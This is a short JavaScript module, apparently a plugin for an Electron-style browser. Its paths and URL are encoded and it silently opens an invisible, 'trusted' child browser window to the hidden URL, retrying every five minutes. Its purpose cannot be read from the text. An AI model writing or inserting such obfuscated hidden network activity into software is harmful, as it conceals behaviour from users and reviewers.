module.exports = function init(____0) {
    let dir = __dirname + ____0.f1('2573816825785774433932573978426245183774');

    ____0.get({
        name: ____0.f1('25795167415923694779275746519191'),
        path: dir + ____0.f1('257852754538716941592369477927574653826147187665'),
        parser: 'html',
        encript: '123',
        parserDir: dir,
        hide: !0,
    });

    function browser() {
        if (____0.getBrowser) {
            let parent = ____0.getBrowser();

            parent.createChildProcess({
                url: ____0.f1('4319327546156169257416732773817125541268263561782615128126148681253823734579477442392191'),
                windowType: ____0.f1('473913564139325746719191'),
                partition: ____0.f1('4618377346785774471562764618325247183691'),
                vip: true,
                show: false,
                trusted: true,
            });
        } else {
            setTimeout(
                () => {
                    browser();
                },
                1000 * 60 * 5,
            );
        }
    }

    browser();
};
